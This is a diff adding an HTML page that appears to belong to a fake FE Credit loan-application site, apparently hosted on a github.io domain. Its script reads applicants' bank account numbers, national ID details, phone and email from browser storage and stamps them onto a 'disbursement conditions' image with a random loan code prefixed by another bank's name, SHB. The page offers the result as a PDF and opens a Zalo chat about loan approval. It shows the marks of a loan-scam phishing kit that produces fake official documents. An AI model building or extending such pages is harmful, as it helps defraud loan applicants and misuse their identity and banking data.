@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Điều Kiện Giải Ngân - FE Credit</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    
+    <!-- Step 1 Style Guide -->
+    <link rel="stylesheet" href="step1-style-guide.css">
+    
+    <style>
+      :root {
+          --primary-color: #00994F;
+          --primary-dark: #015C2E;
+          --primary-light: #9FE870;
+          --secondary-color: #f5f6f5;
+          --accent-color: #9FE870;
+      }
+      body {
+          font-family: 'Roboto', sans-serif;
+          font-size: 16px;
+          background-color: var(--secondary-color);
+          margin: 0;
+      }
+      
+      /* FE Credit Header */
+      .fecredit-header {
+        background: #fff !important;
+        border-bottom: 1px solid #ECECEC;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        padding: 15px 0;
+      }
+      
+      .fecredit-header .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 15px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      
+      .fecredit-header img {
+        height: 40px;
+        max-width: 200px;
+        object-fit: contain;
+      }
+      
+      .header {
+          padding: 15px;
+          background-color: var(--primary-color);
+          border-bottom: 1px solid #ECECEC;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+      }
+      .header img {
+          height: 35px;
+      }
+      .header-icons {
+          display: flex;
+          align-items: center;
+          gap: 15px;
+      }
+      .header-icons i {
+          font-size: 24px;
+          cursor: pointer;
+          color: #ffffff;
+          transition: color 0.3s;
+      }
+      .header-icons i:hover {
+          color: var(--primary-light);
+      }
+      .container {
+          max-width: 90%;
+          width: 100%;
+          margin: 0 auto;
+          padding: 25px;
+          background: white;
+          border-radius: 8px;
+          box-shadow: 0 0 10px rgba(0,0,0,0.1);
+          position: relative;
+      }
+      @media (min-width: 768px) {
+          .container {
+              max-width: 700px;
+              margin: 20px auto;
+          }
+      }
+      .progress-percentage {
+          text-align: center;
+          font-size: 1rem;
+          color: var(--primary-color);
+          margin-bottom: 10px;
+      }
+      .nav-tabs {
+          display: flex;
+          justify-content: space-around;
+          margin-bottom: 25px;
+          margin-top: 0;
+          flex-wrap: nowrap;
+          overflow-x: auto;
+          white-space: nowrap;
+          -webkit-overflow-scrolling: touch;
+      }
+      .nav-tabs .nav-item {
+          flex: 1;
+          text-align: center;
+      }
+      .nav-tabs .nav-link {
+          background-color: #d3d3d3;
+          color: #ffffff;
+          border-radius: 20px;
+          padding: 8px 16px;
+          font-weight: 500;
+          font-size: 14px;
+          width: 100%;
+          margin: 0 5px;
+          transition: background-color 0.3s;
+      }
+      .nav-tabs .nav-link.active {
+          background-color: var(--primary-color);
+          color: #ffffff;
+      }
+      .nav-tabs .nav-link:hover {
+          background-color: var(--primary-light);
+          color: var(--primary-dark);
+      }
+      .dropdown-menu {
+          min-width: 200px;
+          overflow-x: auto;
+          white-space: nowrap;
+      }
+      .dropdown-menu a {
+          color: var(--primary-color);
+          text-transform: uppercase;
+          font-size: 14px;
+          padding: 8px 12px;
+      }
+      .dropdown-menu a:hover {
+          background-color: var(--secondary-color);
+          color: var(--primary-color);
+      }
+      @media (max-width: 767px) {
+          .nav-tabs .nav-link {
+              font-size: 10px;
+              padding: 6px 8px;
+          }
+          .dropdown-menu a {
+              font-size: 12px;
+              padding: 6px 10px;
+          }
+          .progress-percentage {
+              font-size: 0.9rem;
+          }
+      }
+      .step-title {
+          color: var(--primary-color);
+          font-size: 18px;
+          font-weight: 700;
+          margin-bottom: 20px;
+          text-transform: uppercase;
+          text-align: center;
+      }
+      .step-description {
+          font-size: 14px;
+          text-align: center;
+          margin-bottom: 20px;
+          color: #1a3c87;
+      }
+      .image-section {
+          text-align: center;
+          margin: 20px 0;
+      }
+      .canvas-container {
+          position: relative;
+          margin: 20px auto;
+          max-width: 100%;
+          width: 100%;
+          overflow-x: auto;
+          -webkit-overflow-scrolling: touch;
+      }
+      
+      #disbursementCanvas {
+          width: 100%;
+          max-width: 100%;
+          height: auto;
+          display: block;
+          border: 2px solid #e9ecef;
+          border-radius: 8px;
+          image-rendering: -webkit-optimize-contrast;
+          image-rendering: crisp-edges;
+      }
+      
+      @media (max-width: 768px) {
+          .canvas-container {
+              margin: 10px 0;
+              padding: 0 10px;
+          }
+          
+          #disbursementCanvas {
+              max-width: calc(100vw - 40px);
+              border-radius: 4px;
+          }
+      }
+      #disbursementCanvas.loading {
+          opacity: 0.5;
+          background: rgba(248, 249, 250, 0.9);
+      }
+      .btn-download {
+          background-color: #17a2b8;
+          color: white;
+          font-size: 14px;
+          font-weight: 700;
+          padding: 10px 20px;
+          border-radius: 20px;
+          transition: all 0.3s ease;
+      }
+      .btn-download:hover {
+          background-color: var(--primary-color);
+      }
+      .btn-primary {
+          background-color: var(--primary-color);
+          border: none;
+          border-radius: 20px;
+          padding: 10px 20px;
+          font-weight: 700;
+          font-size: 14px;
+          transition: all 0.3s ease;
+          margin: 5px;
+      }
+      .btn-primary:hover {
+          background-color: var(--primary-dark);
+          box-shadow: 0 4px 12px rgba(0, 153, 79, 0.3);
+      }
+      .footer {
+          text-align: center;
+          padding: 20px;
+          background-color: var(--primary-color);
+          color: white;
+          margin-top: 20px;
+          font-size: 12px;
+      }
+      .footer-links a {
+          color: #b3cde0;
+          margin: 0 10px;
+          text-decoration: none;
+          transition: color 0.3s;
+      }
+      .footer-links a:hover {
+          color: var(--primary-light);
+      }
+      .button-group {
+          display: flex;
+          justify-content: center;
+          gap: 15px;
+          margin-top: 15px;
+          flex-wrap: wrap;
+      }
+      @media (max-width: 767px) {
+          .container {
+              max-width: 100% !important;
+              width: 100% !important;
+              padding: 12px !important;
+              margin: 0 !important;
+          }
+          .button-group {
+              flex-direction: row;
+              justify-content: center;
+              flex-wrap: nowrap;
+              gap: 8px;
+          }
+          .button-group a, .button-group button {
+              flex: 1;
+              text-align: center;
+              padding: 8px 10px;
+              font-size: 12px;
+              min-height: 44px;
+          }
+          .step-title {
+              font-size: 16px !important;
+          }
+          .step-description {
+              font-size: 13px !important;
+          }
+          .canvas-container {
+              margin: 10px 0 !important;
+              padding: 0 !important;
+          }
+          #disbursementCanvas {
+              max-width: 100% !important;
+              width: 100% !important;
+          }
+      }
+      .divider-blue {
+          border-top: 1px solid #b3cde0;
+          margin: 15px 0;
+      }
+      .error-message {
+          color: #ff4d4f;
+          font-size: 14px;
+          font-weight: 500;
+          text-align: center;
+          margin-top: 5px;
+          padding: 6px;
+          background-color: #ffe6e6;
+          border-radius: 5px;
+          display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- FE Credit Header -->
+    <header class="fecredit-header">
+      <div class="container">
+        <div style="flex: 0 0 auto;">
+          <a href="index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" style="display: flex; align-items: center; text-decoration: none;">
+            <img src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg" alt="FE CREDIT Logo" 
+                 style="object-fit: contain; height: 40px; max-width: 200px;">
+            <span style="margin-left: 10px; font-size: 14px; font-weight: 600; color: #00994F; display: none;" class="logo-text">FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP</span>
+          </a>
+        </div>
+        <div class="header-icons" style="color: #00994F;">
+          <i class="bi bi-search"></i>
+          <div class="dropdown">
+            <i
+              class="bi bi-list"
+              data-bs-toggle="dropdown"
+              aria-expanded="false"
+            ></i>
+            <ul class="dropdown-menu dropdown-menu-end">
+              <li>
+                <a class="dropdown-item" href="gioi-thieu.html"
+                  >GIỚI THIỆU</a
+                >
+              </li>
+              <li>
+                <a class="dropdown-item" href="tham-chieu.html"
+                  >LỢI ÍCH</a
+                >
+              </li>
+              <li>
+                <a class="dropdown-item" href="lai-suat-vay.html"
+                  >GIẤY TỜ CẦN THIẾT</a
+                >
+              </li>
+              <li>
+                <a class="dropdown-item" href="loan_registration.html"
+                  >ĐĂNG KÝ TRỰC TUYẾN</a
+                >
+              </li>
+              <li>
+                <a class="dropdown-item" href="lai-suat-tien-gui.html"
+                  >XEM KẾT QUẢ</a
+                >
+              </li>
+              <li>
+                <a class="dropdown-item" href="dieu-khoan-su-dung.html"
+                  >ĐIỀU KHOẢN SỬ DỤNG</a
+                >
+              </li>
+              <li>
+                <a
+                  class="dropdown-item"
+                  href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan"
+                  >LIÊN HỆ</a
+                >
+              </li>
+              <li>
+                <a
+                  class="dropdown-item"
+                  href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan"
+                  >ZALO</a
+                >
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </header>
+    
+    <div class="header" style="display: none;">
+      <img
+        src="https://www-cdn.fecredit.com.vn/media/20ymppzv/fec-logo.svg"
+        alt="FE Credit Logo"
+      />
+    </div>
+    <hr class="divider-blue" style="margin: 0" />
+
+    <div class="container">
+      <ul class="nav nav-tabs">
+        <li class="nav-item">
+          <a class="nav-link" href="step1.html">1. Nhập thông tin</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="step4.html"
+            >2. Xác thực và xử lý</a
+          >
+        </li>
+        <li class="nav-item">
+          <a class="nav-link active" href="step7.html"
+            >3. Hoàn thành</a
+          >
+        </li>
+      </ul>
+
+      <div id="step7" class="step-transition">
+        <h5 class="step-title">Điều Kiện Giải Ngân</h5>
+        <div class="error-message" id="formError"></div>
+        <p class="step-description">
+          Dưới đây là các điều kiện giải ngân của khoản vay. Vui lòng kiểm tra
+          kỹ thông tin.
+        </p>
+        <div class="image-section">
+          <div class="canvas-container">
+            <canvas id="disbursementCanvas"></canvas>
+          </div>
+        </div>
+        <hr class="divider-blue" />
+        <div class="button-group">
+          <a href="step6.html" class="btn btn-primary">HỢP ĐỒNG VAY</a>
+          <button id="downloadDisbursementBtn" class="btn btn-download">
+            TẢI XUỐNG
+          </button>
+          <a
+            href="step8.html"
+            class="btn btn-primary"
+            id="proceedToFinalStepBtn"
+            >TIẾP TỤC</a
+          >
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div class="footer-links">
+        <a href="chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+        <a href="dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
+        <a href="dieu-khoan-su-dung.html">Chính sách Cookies</a> |
+        <a href="https://fecredit.com.vn/vi/page/chinh-sach-lien-ket.html"
+          >Miễn khoản từ chối liên kết bên ngoài</a
+        >
+        |
+        <a href="financial-statement.html">Hướng dẫn truy cập web</a> |
+        <a href="https://fecredit.com.vn/vi/page/sitemap-2.html">Sitemap</a> |
+        <a href="dieu-khoan-su-dung.html">Trung tâm bảo mật</a> |
+        <a href="https://online.fecredit.com.vn/global.fecredit"
+          >Demo Ngân hàng trực tuyến</a
+        >
+        |
+        <a
+          href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan"
+          >Liên hệ</a
+        >
+        | <a href="global-fecredit.html">Trang Global Portal</a> |
+        <a href="gioi-thieu.html">Giới Thiệu</a>
+      </div>
+      <p class="mt-3">
+        Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global
+        Portal | Giới Thiệu
+      </p>
+      <p>© 2025 FE CREDIT BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
+
+      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+      <script>
+        const STORAGE_KEY = "userData";
+        const FORM_KEY = "formData";
+        const DISBURSEMENT_IMAGE_PATH = new URL(
+          "https://fecredit.github.io/assets/img/dieukiengiayngan.png",
+          window.location.href
+        ).href;
+
+        let userData = {};
+
+        const safeParse = (value) => {
+          if (!value) return null;
+          try {
+            return JSON.parse(value);
+          } catch (error) {
+            console.warn("Không thể phân tích dữ liệu JSON:", error);
+            return null;
+          }
+        };
+
+        const sanitizeValue = (value) => {
+          if (value === null || value === undefined) return "";
+          if (typeof value === "number") {
+            return Number.isFinite(value) && value !== 0
+              ? String(value)
+              : "";
+          }
+          if (typeof value === "string") {
+            const trimmed = value.trim();
+            if (!trimmed) return "";
+            const upper = trimmed.toUpperCase();
+            if (upper === "N/A" || upper === "NULL" || upper === "UNDEFINED") {
+              return "";
+            }
+            return trimmed;
+          }
+          return "";
+        };
+
+        const normaliseBankName = (raw) => {
+          const value = sanitizeValue(raw);
+          if (!value) return "";
+          return value.replace(/\s+/g, " ");
+        };
+
+        const sanitizePayload = (raw) => {
+          if (!raw || typeof raw !== "object") return {};
+          const output = {};
+          const mapping = {
+            accountNumber: ["accountNumber"],
+            accountHolder: ["accountHolder"],
+            fullName: ["fullName"],
+            bankName: ["bankName", "bank"],
+            cccd: ["cccd"],
+            idIssueDate: ["idIssueDate"],
+            idIssuePlace: ["idIssuePlace"],
+            email: ["email"],
+            phone: ["phone"],
+            loanCode: ["loanCode"],
+            currentStep: ["currentStep"],
+            isRegistered: ["isRegistered"],
+          };
+
+          Object.entries(mapping).forEach(([target, candidates]) => {
+            for (const key of candidates) {
+              if (Object.prototype.hasOwnProperty.call(raw, key)) {
+                const value =
+                  target === "bankName"
+                    ? normaliseBankName(raw[key])
+                    : sanitizeValue(raw[key]);
+                if (value) {
+                  if (target === "currentStep") {
+                    const numeric = Number(value);
+                    if (Number.isFinite(numeric)) {
+                      output[target] = numeric;
+                      break;
+                    }
+                  } else if (target === "isRegistered") {
+                    output[target] = Boolean(raw[key]);
+                    break;
+                  } else {
+                    output[target] = value;
+                    break;
+                  }
+                }
+              }
+            }
+          });
+
+          if (!output.fullName && output.accountHolder) {
+            output.fullName = output.accountHolder;
+          }
+          if (!output.accountHolder && output.fullName) {
+            output.accountHolder = output.fullName;
+          }
+
+          return output;
+        };
+
+        const persistUserData = () => {
+          const payload = sanitizePayload(userData);
+          sessionStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
+        };
+
+        const loadUserData = () => {
+          // 1. Ưu tiên dữ liệu đã lưu trong session (an toàn hơn)
+          const sessionData = safeParse(sessionStorage.getItem(STORAGE_KEY));
+          if (sessionData) {
+            userData = sanitizePayload(sessionData);
+            return true;
+          }
+
+          // 2. Thử lấy dữ liệu từ bước đăng ký ban đầu (Evaluate-conditions)
+          const formData = safeParse(sessionStorage.getItem(FORM_KEY));
+          if (formData) {
+            userData = sanitizePayload({
+              accountNumber: formData.accountNumber,
+              accountHolder: formData.accountHolder || formData.fullName,
+              fullName: formData.fullName,
+              bankName: formData.bank,
+              cccd: formData.cccd,
+              email: formData.email,
+              phone: formData.phone,
+              isRegistered: true,
+            });
+            return true;
+          }
+
+          // 3. Hỗ trợ đọc dữ liệu cũ đã được mã hoá trong localStorage (nếu còn)
+          const legacyEncrypted = localStorage.getItem(STORAGE_KEY);
+          if (legacyEncrypted && window.CryptoJS) {
+            try {
+              const decrypted = CryptoJS.AES.decrypt(
+                legacyEncrypted,
+                "fecredit-secret-key"
+              ).toString(CryptoJS.enc.Utf8);
+              const legacyData = safeParse(decrypted);
+              userData = sanitizePayload(legacyData);
+              localStorage.removeItem(STORAGE_KEY);
+              persistUserData();
+              return true;
+            } catch (error) {
+              console.error("Không thể giải mã dữ liệu cũ:", error);
+            }
+          }
+
+          return false;
+        };
+
+        const generateRandomCode = (prefix) => {
+          const randomNum = Math.floor(100000 + Math.random() * 900000);
+          return `${prefix}${randomNum}`;
+        };
+
+        const ensureLoanCode = () => {
+          if (!userData.loanCode) {
+            userData.loanCode = generateRandomCode("SHB");
+          }
+        };
+
+        const buildCanvasFields = () => {
+          const safeFullName = sanitizeValue(userData.fullName);
+          const safeLoanCode = sanitizeValue(userData.loanCode);
+          return [
+            {
+              value: sanitizeValue(userData.accountNumber),
+              x: 423,
+              y: 322,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: safeFullName,
+              x: 429,
+              y: 354,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: normaliseBankName(userData.bankName),
+              x: 423,
+              y: 390,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: safeFullName,
+              x: 429,
+              y: 444,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: sanitizeValue(userData.cccd),
+              x: 423,
+              y: 487,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: sanitizeValue(userData.idIssueDate),
+              x: 707,
+              y: 487,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: sanitizeValue(userData.idIssuePlace),
+              x: 952,
+              y: 487,
+              font: "bold 23px Arial",
+              color: "#000000",
+            },
+            {
+              value: safeLoanCode,
+              x: 211,
+              y: 60,
+              font: "bold 27px Arial",
+              color: "#000000",
+            },
+            {
+              value: safeLoanCode,
+              x: 211,
+              y: 97,
+              font: "bold 27px Arial",
+              color: "#000000",
+            },
+          ];
+        };
+
+        const drawPlaceholder = (canvas, ctx) => {
+          const containerWidth = canvas.parentElement?.clientWidth || 600;
+          const maxWidth = Math.min(containerWidth * 0.95, 800);
+          const aspectRatio = 1240 / 1754;
+
+          canvas.width = maxWidth;
+          canvas.height = maxWidth / aspectRatio;
+
+          ctx.fillStyle = "#ffffff";
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = "#00994F";
+            ctx.fillRect(60, 90, canvas.width - 120, 160);
+
+          ctx.fillStyle = "#ffffff";
+          ctx.font = "bold 58px Arial";
+          ctx.textAlign = "center";
+          ctx.fillText("THÔNG TIN CHƯA SẴN SÀNG", canvas.width / 2, 170);
+
+          ctx.fillStyle = "#333333";
+          ctx.font = "36px Arial";
+          ctx.fillText(
+            "Vui lòng hoàn tất các bước trước để hiển thị điều kiện giải ngân.",
+            canvas.width / 2,
+            320
+          );
+          ctx.font = "32px Arial";
+          ctx.fillText(
+            "Nếu cần hỗ trợ, liên hệ Hotline FE Credit 1900-1234",
+            canvas.width / 2,
+            380
+          );
+        };
+
+        const renderCanvas = (canvasId, imageUrl) => {
+          const canvas = document.getElementById(canvasId);
+          if (!canvas) return;
+          const ctx = canvas.getContext("2d");
+          const fields = buildCanvasFields();
+
+          const img = new Image();
+          img.crossOrigin = "anonymous";
+          img.src = imageUrl;
+
+          canvas.classList.add("loading");
+          $("#formError").hide();
+
+          const drawFields = () => {
+            const containerWidth = canvas.parentElement?.clientWidth || 600;
+            const maxWidth = Math.min(containerWidth * 0.95, 800);
+            const aspectRatio = 1240 / 1754;
+            canvas.width = maxWidth;
+            canvas.height = maxWidth / aspectRatio;
+
+            if (img.complete && img.naturalWidth) {
+              ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+            } else {
+              drawPlaceholder(canvas, ctx);
+            }
+
+            const scaleX = canvas.width / 1240;
+            const scaleY = canvas.height / 1754;
+            fields.forEach((field) => {
+              if (!field.value) return;
+              const scaledX = field.x * scaleX;
+              const scaledY = field.y * scaleY;
+              const baseFontMatch = field.font.match(/(\d+)px/);
+              const baseFontSize = baseFontMatch
+                ? parseInt(baseFontMatch[1], 10)
+                : 18;
+              const scaledFont = Math.max(
+                Math.round(baseFontSize * Math.min(scaleX, scaleY)),
+                10
+              );
+              ctx.font = field.font.replace(
+                /\d+px/,
+                `${scaledFont.toString()}px`
+              );
+              ctx.fillStyle = field.color;
+              ctx.fillText(field.value, scaledX, scaledY);
+            });
+          };
+
+          img.onload = () => {
+            canvas.classList.remove("loading");
+            drawFields();
+          };
+
+          img.onerror = () => {
+            console.warn("Không thể tải hình nền điều kiện giải ngân:", imageUrl);
+            canvas.classList.remove("loading");
+            drawFields();
+          };
+        };
+
+        const disableActions = (message) => {
+          $("#formError").text(message).show();
+          $("#downloadDisbursementBtn, #proceedToFinalStepBtn")
+            .prop("disabled", true)
+            .attr("aria-disabled", "true");
+        };
+
+        const downloadAsPDF = (canvas, filename) => {
+          if (!canvas || !canvas.width || !canvas.height) {
+            $("#formError")
+              .text("Chưa có dữ liệu hợp lệ để tải xuống.")
+              .show();
+            return;
+          }
+          const { jsPDF } = window.jspdf;
+          const pdf = new jsPDF({
+            orientation: canvas.width > canvas.height ? "landscape" : "portrait",
+            unit: "px",
+            format: [canvas.width, canvas.height],
+          });
+          pdf.addImage(
+            canvas.toDataURL("image/png"),
+            "PNG",
+            0,
+            0,
+            canvas.width,
+            canvas.height
+          );
+          pdf.save(filename);
+        };
+
+        window.addEventListener("load", () => {
+          if (!loadUserData()) {
+            disableActions(
+              "Không tìm thấy dữ liệu hồ sơ trong phiên hiện tại. Vui lòng quay lại bước đăng ký để nhập lại thông tin."
+            );
+            return;
+          }
+
+          ensureLoanCode();
+          userData.isRegistered = Boolean(
+            sanitizeValue(userData.fullName) || sanitizeValue(userData.accountHolder)
+          );
+          userData.currentStep = Math.max(Number(userData.currentStep || 7), 7);
+          persistUserData();
+
+          if (!userData.isRegistered) {
+            disableActions(
+              "Thiếu thông tin chủ thể hồ sơ. Vui lòng kiểm tra lại các bước trước khi tiếp tục."
+            );
+            const canvas = document.getElementById("disbursementCanvas");
+            if (canvas) {
+              const ctx = canvas.getContext("2d");
+              if (ctx) drawPlaceholder(canvas, ctx);
+            }
+            return;
+          }
+
+          renderCanvas("disbursementCanvas", DISBURSEMENT_IMAGE_PATH);
+        });
+
+        $("#downloadDisbursementBtn").on("click", function (event) {
+          if (this.hasAttribute("disabled")) return;
+          const canvas = document.getElementById("disbursementCanvas");
+          downloadAsPDF(
+            canvas,
+            `DieuKienGiaiNgan_${sanitizeValue(userData.loanCode) || "tam-thoi"}.pdf`
+          );
+        });
+
+        $("#proceedToFinalStepBtn").on("click", function (event) {
+          if (this.hasAttribute("disabled")) return;
+          event.preventDefault();
+          userData.currentStep = 8;
+          persistUserData();
+          window.location.href = "step8.html";
+        });
+      </script>
+
+    <div
+      class="zalo-chat-widget"
+      data-oaid="3932037504673339016"
+      data-welcome-message="Chào anh chị ạ , mình cần hỗ trợ thẩm định và xét duyệt điều kiện giải ngân đúng không ạ !"
+      data-autopopup="5"
+      data-width=""
+      data-height=""
+    ></div>
+    <script src="https://sp.zalo.me/plugins/sdk.js"></script>
+  </body>
+</html>
